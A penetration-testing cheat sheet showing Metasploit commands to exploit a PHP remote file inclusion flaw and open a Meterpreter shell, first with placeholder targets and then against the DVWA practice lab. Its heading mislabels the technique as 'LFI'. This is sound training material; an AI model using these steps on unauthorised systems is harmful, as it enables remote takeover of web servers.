# Metasploit

## Remote File Inclusion (LFI)

### Module Usage

```
msf > use exploit/unix/webapp/php_include

msf exploit(unix/webapp/php_include) > set payload php/meterpreter/bind_tcp

msf exploit(unix/webapp/php_include) > options

Module options (exploit/unix/webapp/php_include):



   Name      Current Setting                                                      Required  Description                                                                                                                              
   ----      ---------------                                                      --------  -----------                                                                                                                              
   HEADERS                                                                        no        Any additional HTTP headers to send, cookies for example. Format: "header:value,header2:value2"
   PATH      /                                                                    yes       The base directory to prepend to the URL to try
   PHPRFIDB  /usr/share/metasploit-framework/data/exploits/php/rfi-locations.dat  no        A local file containing a list of URLs to try, with XXpathXX replacing the URL
   PHPURI                                                                         no        The URI to request, with the include parameter changed to XXpathXX
   POSTDATA                                                                       no        The POST data to send, with the include parameter changed to XXpathXX
   Proxies                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     80                                                                   yes       The target port (TCP)
   SRVHOST   0.0.0.0                                                              yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080                                                                 yes       The local port to listen on.
   SSL       false                                                                no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                                                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                                                        no        The URI to use for this exploit (default is random)
   VHOST                                                                          no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(unix/webapp/php_include) > set rhost <target_IP>

msf exploit(unix/webapp/php_include) > set rport <target_PORT>

msf exploit(unix/webapp/php_include) > set path /path/to/uri/directory/

msf exploit(unix/webapp/php_include) > set phpuri /?parameter=XXpathXX

msf exploit(unix/webapp/php_include) > set headers "Cookie:<cookie_header>=<cookie_value>"

msf exploit(unix/webapp/php_include) > set lport 8843

msf exploit(unix/webapp/php_include) > run
```

### Exploit

```
msf exploit(unix/webapp/php_include) > set rhost dvwa.local

msf exploit(unix/webapp/php_include) > set rport 80

msf exploit(unix/webapp/php_include) > set path /dvwa/vulnerabilities/fi/

msf exploit(unix/webapp/php_include) > set phpuri /?page=XXpathXX

msf exploit(unix/webapp/php_include) > set headers "Cookie:<cookie_header>=<cookie_value>"

msf exploit(unix/webapp/php_include) > set lport 8843

msf exploit(unix/webapp/php_include) > run
```

---
## References

- [Metasploit Unleashed: File Inclusion Vulnerabilities](https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/)

- [Metasploit Unleashed: PHP Meterpreter](https://www.offsec.com/metasploit-unleashed/php-meterpreter/)

- [YeahHub: From RFI to Meterpreter Shell](https://www.yeahhub.com/from-rfi-to-meterpreter-shell/)